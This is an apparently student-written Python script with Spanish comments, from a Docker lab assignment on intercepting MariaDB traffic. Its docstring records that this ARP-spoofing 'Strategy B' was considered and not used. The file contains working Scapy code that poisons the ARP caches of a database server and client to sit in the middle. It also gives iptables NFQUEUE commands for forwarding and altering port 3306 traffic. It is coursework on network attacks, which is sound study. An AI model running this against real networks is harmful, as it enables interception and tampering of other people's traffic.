#!/usr/bin/env python3
"""
DISEÑO EXPLORADO, NO EJECUTADO EN LA ENTREGA FINAL (Tarea 3, spec §3).
=====================================================================
Se evaluó esta Estrategia B (Scapy como tercer nodo en db_network, envenenando
las cachés ARP de servidor y cliente) y se decidió NO usarla: la Estrategia A
(NFQUEUE + namespace compartido) ya cubre fuzzing y modificación de campos, y
cambiar de topología competía con el peso real de la tarea.

Además, tal como está el docker-compose.yml (network_mode: "service:cliente"),
scapy_mitm ES la misma pila de red que el cliente: no hay un "medio" en el que
insertarse — un contenedor no puede ARP-spoofearse respecto de sí mismo. Para
ejecutar este script habría que mover scapy a "networks: db_network". Se
conserva en el repo como constancia del análisis; no se graba demo en el video.

---
Estrategia B: ARP spoofing entre mariadb_server y cloudbeaver_client.

Envenena la caché ARP de ambos para colocarse en medio (MITM) dentro del
bridge db_network. Para reenviar/modificar el tráfico, activa además:
    sysctl -w net.ipv4.ip_forward=1
    iptables -A FORWARD -p tcp --dport 3306 -j NFQUEUE --queue-num 1

Requiere que el servicio scapy esté en el bloque "networks: db_network"
(NO en network_mode: service:cliente).
"""
import time
import socket
from scapy.all import ARP, Ether, send, srp, get_if_hwaddr, conf


def resolver(nombre):
    return socket.gethostbyname(nombre)


def mac_de(ip):
    # Resuelve la MAC enviando un who-has por el bridge.
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2, retry=3, verbose=False,
    )
    for _, rcv in ans:
        return rcv.hwsrc
    raise RuntimeError(f"No pude resolver la MAC de {ip}")


def envenenar(victima_ip, victima_mac, suplantar_ip):
    # Le decimos a 'victima' que suplantar_ip está en NUESTRA MAC.
    send(ARP(op=2, pdst=victima_ip, hwdst=victima_mac,
             psrc=suplantar_ip), verbose=False)


def main():
    servidor_ip = resolver("mariadb_server")
    cliente_ip = resolver("cloudbeaver_client")
    servidor_mac = mac_de(servidor_ip)
    cliente_mac = mac_de(cliente_ip)

    print(f"[*] servidor {servidor_ip} ({servidor_mac})")
    print(f"[*] cliente  {cliente_ip} ({cliente_mac})")
    print(f"[*] atacante {conf.iface} ({get_if_hwaddr(conf.iface)})")
    print("[*] Envenenando ARP cada 2s. Ctrl-C para restaurar.")

    try:
        while True:
            envenenar(cliente_ip, cliente_mac, servidor_ip)
            envenenar(servidor_ip, servidor_mac, cliente_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restaurando cachés ARP...")
        # Reenvía las MACs reales para dejar la red como estaba.
        for _ in range(5):
            send(ARP(op=2, pdst=cliente_ip, hwdst=cliente_mac,
                     psrc=servidor_ip, hwsrc=servidor_mac), verbose=False)
            send(ARP(op=2, pdst=servidor_ip, hwdst=servidor_mac,
                     psrc=cliente_ip, hwsrc=cliente_mac), verbose=False)


if __name__ == "__main__":
    main()
